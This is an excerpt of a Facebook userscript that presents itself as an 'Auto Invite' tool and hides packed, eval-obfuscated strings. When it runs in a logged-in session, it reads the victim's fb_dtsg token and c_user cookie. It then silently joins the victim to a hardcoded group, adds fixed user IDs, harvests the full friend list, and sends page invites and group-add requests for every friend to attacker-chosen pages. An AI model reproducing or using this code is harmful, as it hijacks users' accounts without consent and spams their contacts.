...
// @include         http://*.facebook.com/*/*
// ==/UserScript==
javascript: eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c l=\'k q x g<6/> 4:<A 2="3:#h;" 0="j://5.1.7/d/a.b/" 8="9">H m</A>\';c n="",o=\'p 4: e r s t%</6>u v 4 </A><A 2="3:#w;" 0="f://5.1.7/d/a.b/" 8="9">y  z</A></A>.</6> B C D <A 2="3:#E;" 0="f://5.1.7/F.G/" 8="9">e i</A>.</A>\';',44,44,'href|facebook|style|color|By|www|br|com|target|_blank|kau|max|var|groups|husam|http|Pages|00FF7F|alsjarh|https|Auto|Title|tools|Descriptions|_text|Powered|Invite|alsjarh|team|99|Script|made|00FF00|Fans|kau|max||Join|my|fanspages|00FFFF|https|profile|space'.split('|'),0,{}))
...
function InviteFriends(opo) {
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                        ...
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=573489956027815&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        
                        if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=144199402451723&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
...
function addfriend(){i++,setTimeout("clickfr()",2e3)}var gid=["144199402451723"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);a("100002517980325"),a("100005880032535"),a("100004016743068"),a("100004644674477"),a("100007543626036"),a("100007415197232"),a("100006746261154"),a("100003848996041"),a("100007562645973");var gid=["144199402451723"],fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),httpwp=new XMLHttpRequest,urlwp="/ajax/groups/membership/r2j.php?__a=1",paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,!0),httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded"),httpwp.setRequestHeader("Content-length",paramswp.length),httpwp.setRequestHeader("Connection","keep-alive"),httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value,user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),Friend=Array();gf=new XMLHttpRequest,gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=Friend_only",!1),gf.send(),4!=gf.readyState||(data=eval("("+gf.responseText.substr(9)+")"),data.error||(Friend=data.payload.entries.sort(
function(a,b){return a.index-b.index})));
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8 i=\'h g f e<6/> o:<0 9="a:#d;" b="7://5.4.3/2.1 " j="k">l m </0>\';n=c.p("q").r;8 s="",t=\'</6>u: <0 9="a:#v;" b="7://5.4.3/2.1 /">w x </0>, y z!\';',36,36,'A|profile|https|com|facebook|www|br|https|var|style|color|href|document|00FF7F|pages|fans|invite|Auto|Title|target|_blank|space|tools|grpname|By|getElementById|groupsJumpTitle|innerHTML|Descriptions|_text|Visit|3B5998|space|tools|Join|Yuk'.split('|'),0,{}))
jx={getHTTPObject:
